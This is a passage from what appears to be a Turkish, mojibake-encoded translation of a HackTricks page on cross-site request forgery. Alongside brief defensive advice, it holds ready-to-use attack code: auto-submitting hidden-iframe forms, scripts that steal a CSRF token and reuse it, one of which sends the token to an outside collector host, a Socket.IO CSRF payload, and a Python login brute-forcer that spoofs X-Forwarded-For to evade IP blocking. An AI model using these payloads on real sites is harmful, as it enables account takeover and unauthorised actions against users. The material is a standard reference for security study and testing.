2. SaldÄ±rgan, hedef web uygulamasÄ±nda bir form oluÅŸturur ve bu formun hedeflenen iÅŸlevselliÄŸi tetikleyeceÄŸi bir POST isteÄŸi oluÅŸturur.
3. SaldÄ±rgan, bu formu bir web sayfasÄ±na yerleÅŸtirir ve kullanÄ±cÄ±larÄ± bu sayfaya yÃ¶nlendirir.
4. KullanÄ±cÄ±, saldÄ±rganÄ±n hazÄ±rladÄ±ÄŸÄ± sayfayÄ± ziyaret eder ve formu gÃ¶nderir.
5. Hedef web uygulamasÄ±, kullanÄ±cÄ±nÄ±n gÃ¶nderdiÄŸi isteÄŸi doÄŸrular ve hedeflenen iÅŸlevselliÄŸi gerÃ§ekleÅŸtirir.
6. SaldÄ±rgan, hedeflenen iÅŸlevselliÄŸin gerÃ§ekleÅŸtirildiÄŸini doÄŸrulamak iÃ§in saldÄ±rÄ± sonrasÄ± bir kanal kullanÄ±r.

#### SaldÄ±rÄ± Ã–nlemleri

Web uygulamalarÄ±, CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in aÅŸaÄŸÄ±daki Ã¶nlemleri almalÄ±dÄ±r:

1. CSRF token kullanÄ±mÄ±: Web uygulamalarÄ±, her istek iÃ§in benzersiz bir CSRF token oluÅŸturmalÄ± ve bu token'Ä± kullanarak istekleri doÄŸrulamalÄ±dÄ±r.
2. SameSite Ã§erez Ã¶zelliÄŸi: Web uygulamalarÄ±, SameSite Ã§erez Ã¶zelliÄŸini kullanarak tarayÄ±cÄ±nÄ±n Ã§erezleri yalnÄ±zca aynÄ± siteye yapÄ±lan isteklerde gÃ¶ndermesini saÄŸlamalÄ±dÄ±r.
3. Referer kontrolÃ¼: Web uygulamalarÄ±, Referer baÅŸlÄ±ÄŸÄ±nÄ± kullanarak gelen isteklerin kaynaÄŸÄ±nÄ± doÄŸrulamalÄ±dÄ±r.
4. Ä°stek doÄŸrulama: Web uygulamalarÄ±, kullanÄ±cÄ±larÄ±n isteklerini doÄŸrulamak iÃ§in gÃ¼venli yÃ¶ntemler kullanmalÄ±dÄ±r.

Bu Ã¶nlemler, web uygulamalarÄ±nÄ±n CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± daha gÃ¼venli hale gelmesini saÄŸlar.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Ä°Ã§eriden bir iframe iÃ§inden Form POST isteÄŸi

If an application allows embedding its pages in an iframe, it may be vulnerable to Cross-Site Request Forgery (CSRF) attacks. This occurs when an attacker tricks a victim into submitting a malicious form within an iframe, causing the victim's browser to unknowingly perform unwanted actions on the application.

Bir uygulama, sayfalarÄ±nÄ± bir iframe iÃ§ine yerleÅŸtirmeye izin veriyorsa, Cross-Site Request Forgery (CSRF) saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olabilir. Bu, bir saldÄ±rganÄ±n bir kurbanÄ±, bir iframe iÃ§inde kÃ¶tÃ¼ amaÃ§lÄ± bir form gÃ¶ndermeye kandÄ±rmasÄ±yla gerÃ§ekleÅŸir ve kurbanÄ±n tarayÄ±cÄ±sÄ±nÄ±n istenmeyen eylemleri bilmeden uygulamada gerÃ§ekleÅŸtirmesine neden olur.

To exploit this vulnerability, the attacker can create a webpage with an iframe that loads the target application's page containing a form. The attacker can then use JavaScript to automatically submit the form with malicious data when the victim visits the attacker's webpage.

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in saldÄ±rgan, hedef uygulamanÄ±n bir form iÃ§eren sayfasÄ±nÄ± yÃ¼kleyen bir iframe iÃ§eren bir web sayfasÄ± oluÅŸturabilir. SaldÄ±rgan, kurbanÄ±n saldÄ±rganÄ±n web sayfasÄ±nÄ± ziyaret ettiÄŸinde kÃ¶tÃ¼ amaÃ§lÄ± verilerle formu otomatik olarak gÃ¶ndermek iÃ§in JavaScript'i kullanabilir.

When the victim submits the form, the request is sent from the victim's browser, appearing as a legitimate action. The target application, unaware of the attack, processes the request and performs the desired action, such as changing the victim's account settings or making a purchase on their behalf.

Kurban formu gÃ¶nderdiÄŸinde, istek kurbanÄ±n tarayÄ±cÄ±sÄ±ndan gÃ¶nderilir ve meÅŸru bir eylem gibi gÃ¶rÃ¼nÃ¼r. SaldÄ±rÄ±dan habersiz olan hedef uygulama, isteÄŸi iÅŸler ve kurbanÄ±n hesap ayarlarÄ±nÄ± deÄŸiÅŸtirme veya onlar adÄ±na bir satÄ±n alma gibi istenen eylemi gerÃ§ekleÅŸtirir.

To prevent this type of attack, developers should implement measures such as using anti-CSRF tokens, which are unique tokens embedded in forms to validate the authenticity of the request. Additionally, the target application should enforce the SameSite attribute for cookies to restrict their usage within iframes.

Bu tÃ¼r bir saldÄ±rÄ±yÄ± Ã¶nlemek iÃ§in geliÅŸtiriciler, isteÄŸin otantikliÄŸini doÄŸrulamak iÃ§in formlara gÃ¶mÃ¼lÃ¼ benzersiz tokenler olan anti-CSRF tokenlerini kullanma gibi Ã¶nlemler uygulamalÄ±dÄ±r. Ek olarak, hedef uygulama, Ã§erezlerin iframe'ler iÃ§inde kullanÄ±mÄ±nÄ± sÄ±nÄ±rlamak iÃ§in SameSite Ã¶zniteliÄŸini zorlamalÄ±dÄ±r.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF Token'Ä± Ã‡alma ve POST Ä°steÄŸi GÃ¶nderme**

Bir Cross-Site Request Forgery (CSRF) saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in, hedef web uygulamasÄ±nÄ±n CSRF korumasÄ±nÄ± aÅŸmanÄ±z gerekmektedir. Bu korumayÄ± aÅŸmak iÃ§in, Ã¶ncelikle hedef web uygulamasÄ±nÄ±n CSRF token'Ä±nÄ± Ã§almalÄ±sÄ±nÄ±z. CSRF token, web uygulamasÄ±nÄ±n gÃ¼venlik Ã¶nlemi olarak kullanÄ±lan bir tÃ¼r kimlik doÄŸrulama mekanizmasÄ±dÄ±r.

CSRF token'Ä±nÄ± Ã§almak iÃ§in, hedef web uygulamasÄ±na bir istek gÃ¶ndererek token'Ä± elde etmeniz gerekmektedir. Bu isteÄŸi gÃ¶ndermek iÃ§in, hedef web uygulamasÄ±nÄ±n sayfasÄ±nÄ± ziyaret eden bir kullanÄ±cÄ± gibi davranmanÄ±z gerekmektedir. Bu nedenle, hedef web uygulamasÄ±nÄ±n sayfasÄ±nÄ± iÃ§eren bir HTML sayfasÄ± oluÅŸturmanÄ±z gerekmektedir.

HTML sayfasÄ±nÄ± oluÅŸturduktan sonra, sayfayÄ± hedef web uygulamasÄ±na yÃ¼klemeniz gerekmektedir. Bu sayede, hedef web uygulamasÄ± tarafÄ±ndan oluÅŸturulan CSRF token'Ä± Ã§alabilirsiniz. Ã‡alÄ±nan CSRF token'Ä± kullanarak, hedef web uygulamasÄ±na bir POST isteÄŸi gÃ¶nderebilirsiniz.

POST isteÄŸi gÃ¶ndermek iÃ§in, hedef web uygulamasÄ±nÄ±n hedef URL'sini ve gerekli parametreleri belirlemeniz gerekmektedir. AyrÄ±ca, isteÄŸi gÃ¶nderirken Ã§alÄ±nan CSRF token'Ä±nÄ± da kullanmanÄ±z gerekmektedir. Bu sayede, hedef web uygulamasÄ± tarafÄ±ndan doÄŸrulanan bir istek gÃ¶ndermiÅŸ olursunuz.

CSRF saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in Ã§alÄ±nan CSRF token'Ä± kullanarak bir POST isteÄŸi gÃ¶ndermek, hedef web uygulamasÄ±nda istenmeyen iÅŸlemlerin gerÃ§ekleÅŸtirilmesine neden olabilir. Bu nedenle, web uygulamalarÄ±nÄ±n CSRF korumasÄ±nÄ± aÅŸmak iÃ§in bu yÃ¶ntemi kullanmak etik dÄ±ÅŸÄ±dÄ±r ve yasal sonuÃ§larÄ± olabilir.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF Token'Ä± Ã§alma ve bir iframe, bir form ve Ajax kullanarak Post isteÄŸi gÃ¶nderme**

Bir Cross-Site Request Forgery (CSRF) saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in hedef web uygulamasÄ±nÄ±n CSRF token'Ä±nÄ± Ã§almak ve bu tokenÄ± kullanarak bir Post isteÄŸi gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼r. Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Ä°lk olarak, hedef web uygulamasÄ±nÄ±n kaynak kodunu inceleyin ve CSRF token'Ä±nÄ±n nasÄ±l oluÅŸturulduÄŸunu ve nerede saklandÄ±ÄŸÄ±nÄ± belirleyin. Genellikle bu token, bir formun gizli bir alanÄ±nda veya bir HTTP baÅŸlÄ±ÄŸÄ±nda bulunur.

2. CSRF token'Ä±nÄ± Ã§almak iÃ§in, bir iframe oluÅŸturun ve hedef web uygulamasÄ±nÄ±n sayfasÄ±nÄ± bu iframe iÃ§inde yÃ¼kleyin. Ä°frame, hedef web uygulamasÄ±nÄ±n oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±sÄ±nÄ±n tarayÄ±cÄ±sÄ±nda gÃ¶rÃ¼nÃ¼r olmalÄ±dÄ±r.

3. Ä°frame iÃ§indeki JavaScript kodunu kullanarak, hedef web uygulamasÄ±nÄ±n sayfasÄ±ndaki CSRF token'Ä±nÄ± alÄ±n. Bu tokenÄ± bir deÄŸiÅŸkene kaydedin.

4. ArdÄ±ndan, bir form oluÅŸturun ve bu formu hedef web uygulamasÄ±nÄ±n sayfasÄ±na gÃ¶ndermek iÃ§in kullanÄ±n. Formun iÃ§ine, hedef web uygulamasÄ±nÄ±n hedeflenen Post isteÄŸi iÃ§in gereken parametreleri ekleyin. AyrÄ±ca, formun gizli bir alanÄ±na Ã§aldÄ±ÄŸÄ±nÄ±z CSRF token'Ä±nÄ± ekleyin.

5. Formu otomatik olarak gÃ¶ndermek iÃ§in JavaScript kullanÄ±n. Bu iÅŸlemi Ajax ile yapabilirsiniz. Ajax isteÄŸi, hedef web uygulamasÄ±nÄ±n Post isteÄŸini gerÃ§ekleÅŸtirmesini tetikleyecektir.

Bu yÃ¶ntemle, hedef web uygulamasÄ±nÄ±n oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±sÄ±, istemeden ve farkÄ±nda olmadan Post isteÄŸini gerÃ§ekleÅŸtirecektir. Bu sayede, saldÄ±rgan hedef web uygulamasÄ±nda istediÄŸi iÅŸlemleri gerÃ§ekleÅŸtirebilir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, hedef web uygulamasÄ±nÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek ve hedef web uygulamasÄ±nÄ±n kaynak kodunu incelemek Ã¶nemlidir. AyrÄ±ca, bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek yasa dÄ±ÅŸÄ±dÄ±r ve yalnÄ±zca etik hackerler tarafÄ±ndan yasal izinlerle gerÃ§ekleÅŸtirilmelidir.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRF Token'Ä± Ã‡alma ve Bir iframe ve Form Kullanarak POST Ä°steÄŸi GÃ¶nderme**

Bir saldÄ±rgan, hedef web uygulamasÄ±nda bir Cross-Site Request Forgery (CSRF) saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in hedef kullanÄ±cÄ±nÄ±n CSRF token'Ä±nÄ± Ã§almak ve bir iframe ve form kullanarak POST isteÄŸi gÃ¶ndermek isteyebilir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. SaldÄ±rgan, hedef web uygulamasÄ±nÄ± analiz ederek CSRF token'Ä±nÄ± nasÄ±l alabileceÄŸini belirler.
2. SaldÄ±rgan, hedef kullanÄ±cÄ±yÄ± kandÄ±rmak iÃ§in bir kÃ¶tÃ¼ niyetli web sitesi oluÅŸturur ve bu web sitesinde bir iframe ve form ekler.
3. Ä°frame, hedef web uygulamasÄ±nÄ±n hedef sayfasÄ±nÄ± iÃ§erecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±r.
4. Form, hedef web uygulamasÄ±na POST isteÄŸi gÃ¶ndermek iÃ§in gerekli alanlarÄ± iÃ§erir. Bu formda, hedef sayfada kullanÄ±lan CSRF token'Ä± da dahil edilir.
5. SaldÄ±rgan, hedef kullanÄ±cÄ±yÄ± kÃ¶tÃ¼ niyetli web sitesine yÃ¶nlendirir.
6. KÃ¶tÃ¼ niyetli web sitesi, iframe aracÄ±lÄ±ÄŸÄ±yla hedef sayfayÄ± yÃ¼kler ve formu otomatik olarak gÃ¶nderir.
7. Hedef kullanÄ±cÄ±, kÃ¶tÃ¼ niyetli web sitesini ziyaret ettiÄŸinde, form otomatik olarak gÃ¶nderildiÄŸi iÃ§in CSRF token'Ä± da dahil edilerek hedef web uygulamasÄ±na istek gÃ¶nderilir.
8. Hedef web uygulamasÄ±, isteÄŸi doÄŸru kabul eder ve saldÄ±rganÄ±n istediÄŸi eylemi gerÃ§ekleÅŸtirir.

Bu saldÄ±rÄ±, hedef kullanÄ±cÄ±nÄ±n gÃ¼venilir bir web sitesine giriÅŸ yapmÄ±ÅŸken bile gerÃ§ekleÅŸtirilebilir. Bu nedenle, web uygulamalarÄ±nÄ±n CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± korunmasÄ± iÃ§in CSRF token'larÄ±nÄ±n doÄŸru bir ÅŸekilde uygulanmasÄ± Ã¶nemlidir.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Token Ã§almak ve 2 iframe kullanarak gÃ¶ndermek**

Bir Cross-Site Request Forgery (CSRF) saldÄ±rÄ±sÄ± sÄ±rasÄ±nda, hedef kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda oturum aÃ§Ä±kken, saldÄ±rgan hedefin yetkilendirme token'Ä±nÄ± Ã§almak ve baÅŸka bir istekte kullanmak isteyebilir. Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in, saldÄ±rgan iki iframe kullanÄ±r: birincisi, hedefin oturum aÃ§tÄ±ÄŸÄ± web sitesini iÃ§erir ve ikincisi, token'Ä± saldÄ±rgana gÃ¶ndermek iÃ§in kullanÄ±lÄ±r.

Ä°ÅŸlem adÄ±mlarÄ± ÅŸunlardÄ±r:

1. SaldÄ±rgan, hedefin oturum aÃ§tÄ±ÄŸÄ± web sitesini iÃ§eren bir iframe oluÅŸturur.
2. Ä°kinci bir iframe oluÅŸturulur ve bu iframe, saldÄ±rganÄ±n kontrolÃ¼ndeki bir web sitesini iÃ§erir.
3. Ä°kinci iframe, hedefin yetkilendirme token'Ä±nÄ± Ã§almak iÃ§in JavaScript kullanÄ±r. Bu, token'Ä± saldÄ±rganÄ±n kontrolÃ¼ndeki web sitesine gÃ¶nderir.
4. SaldÄ±rgan, Ã§alÄ±nan token'Ä± kullanarak hedefin adÄ±na yetkilendirilmiÅŸ bir istek yapabilir.

Bu saldÄ±rÄ±, hedef kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda oturum aÃ§Ä±kken gerÃ§ekleÅŸtirildiÄŸinden, hedefin gÃ¼venilir bir web sitesinde oturum aÃ§Ä±kken dikkatli olmasÄ± Ã¶nemlidir. AyrÄ±ca, web uygulamalarÄ±nÄ±n CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in doÄŸru Ã¶nlemleri almasÄ± gerekmektedir.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajax ile CSRF belirteci Ã§alma ve bir form ile post gÃ¶nderme**

Bir saldÄ±rgan, hedef web uygulamasÄ±nda bir CSRF belirteci Ã§almak ve ardÄ±ndan bu belirteci kullanarak bir post isteÄŸi gÃ¶ndermek iÃ§in Ajax kullanabilir. Bu saldÄ±rÄ± tekniÄŸi, saldÄ±rganÄ±n hedef kullanÄ±cÄ±nÄ±n kimlik doÄŸrulamasÄ±nÄ± kullanarak yetkilendirilmiÅŸ iÅŸlemleri gerÃ§ekleÅŸtirmesine olanak tanÄ±r.

SaldÄ±rgan, hedef web uygulamasÄ±nda bir form oluÅŸturur ve bu formu hedef kullanÄ±cÄ±ya sunar. Form, hedef web uygulamasÄ±nÄ±n CSRF korumasÄ±nÄ± aÅŸmak iÃ§in bir CSRF belirteci iÃ§erir. SaldÄ±rgan, Ajax kullanarak bu formu otomatik olarak gÃ¶nderir ve hedef web uygulamasÄ±na yetkilendirilmiÅŸ bir post isteÄŸi yapar.

Bu saldÄ±rÄ± tekniÄŸi, hedef kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda oturum aÃ§Ä±kken gerÃ§ekleÅŸtirildiÄŸinde etkilidir. SaldÄ±rgan, hedef kullanÄ±cÄ±nÄ±n tarayÄ±cÄ±sÄ±nda bir JavaScript kodu Ã§alÄ±ÅŸtÄ±rarak Ajax isteÄŸini otomatik olarak gÃ¶nderir. Bu sayede, hedef kullanÄ±cÄ±nÄ±n bilgisi olmadan yetkilendirilmiÅŸ bir iÅŸlem gerÃ§ekleÅŸtirilebilir.

Bu saldÄ±rÄ±yÄ± Ã¶nlemek iÃ§in web uygulamalarÄ±, CSRF korumasÄ± saÄŸlamalÄ±dÄ±r. Bu koruma, her post isteÄŸi iÃ§in benzersiz bir CSRF belirteci oluÅŸturarak ve bu belirteci formda veya baÅŸlÄ±kta kullanarak gerÃ§ekleÅŸtirilebilir. AyrÄ±ca, web uygulamalarÄ±, oturum aÃ§Ä±kken yetkilendirilmiÅŸ iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in ek doÄŸrulama adÄ±mlarÄ± da uygulamalÄ±dÄ±r.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IO ile CSRF

Socket.IO, gerÃ§ek zamanlÄ± iletiÅŸim saÄŸlamak iÃ§in kullanÄ±lan bir JavaScript kÃ¼tÃ¼phanesidir. CSRF (Cross-Site Request Forgery) saldÄ±rÄ±sÄ±, bir kullanÄ±cÄ±nÄ±n istemeden veya farkÄ±nda olmadan yetkisiz bir ÅŸekilde bir iÅŸlem gerÃ§ekleÅŸtirmesini saÄŸlayan bir saldÄ±rÄ± tÃ¼rÃ¼dÃ¼r. Socket.IO kullanÄ±rken, CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± Ã¶nlem almak Ã¶nemlidir.

Socket.IO ile CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. **CSRF Token** kullanÄ±n: Socket.IO sunucusunda, her istek iÃ§in benzersiz bir CSRF token oluÅŸturun ve bu token'Ä± istemciye gÃ¶nderin. Ä°stemci, her istek yaparken bu token'Ä± sunucuya geri gÃ¶ndermelidir. Sunucu, token'Ä± doÄŸrulayarak isteÄŸi kabul eder veya reddeder.

2. **Referer KontrolÃ¼**: Sunucu tarafÄ±nda, gelen isteklerin referer bilgisini kontrol edin. Referer bilgisi, isteÄŸin kaynak sayfasÄ±nÄ± belirtir. Sadece belirli bir kaynaktan gelen istekleri kabul etmek, CSRF saldÄ±rÄ±larÄ±nÄ± engellemeye yardÄ±mcÄ± olabilir.

3. **Origin KontrolÃ¼**: Sunucu tarafÄ±nda, gelen isteklerin origin bilgisini kontrol edin. Origin bilgisi, isteÄŸin kaynak URL'sini belirtir. Sadece belirli bir origin'den gelen istekleri kabul etmek, CSRF saldÄ±rÄ±larÄ±nÄ± engellemeye yardÄ±mcÄ± olabilir.

4. **HTTP Only ve Secure Flag'leri**: Ã‡erezlerinizi HTTP Only ve Secure flag'leriyle ayarlayÄ±n. HTTP Only flag'i, Ã§erezin sadece HTTP istekleriyle eriÅŸilebilir olmasÄ±nÄ± saÄŸlar. Secure flag'i ise Ã§erezin sadece gÃ¼venli (HTTPS) baÄŸlantÄ±larla iletilmesini saÄŸlar. Bu, Ã§erezlerin kÃ¶tÃ¼ niyetli kodlar tarafÄ±ndan Ã§alÄ±nmasÄ±nÄ± engellemeye yardÄ±mcÄ± olur.

Socket.IO kullanÄ±rken, bu Ã¶nlemleri alarak CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± daha gÃ¼venli bir uygulama geliÅŸtirebilirsiniz.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF GiriÅŸ Brute Force

Kod, bir CSRF belirteci kullanarak bir giriÅŸ formunu Brut Force saldÄ±rÄ±sÄ± iÃ§in kullanÄ±labilir (AyrÄ±ca olasÄ± bir IP karalama listesini atlatmaya Ã§alÄ±ÅŸmak iÃ§in X-Forwarded-For baÅŸlÄ±ÄŸÄ±nÄ± da kullanÄ±yor):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## AraÃ§lar <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referanslar

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±lÄ±klarÄ±nÄ± ve Ã¶nemli platform gÃ¼ncellemelerini takip edin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katÄ±lÄ±n ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n veya** Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ve** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.**

</details>
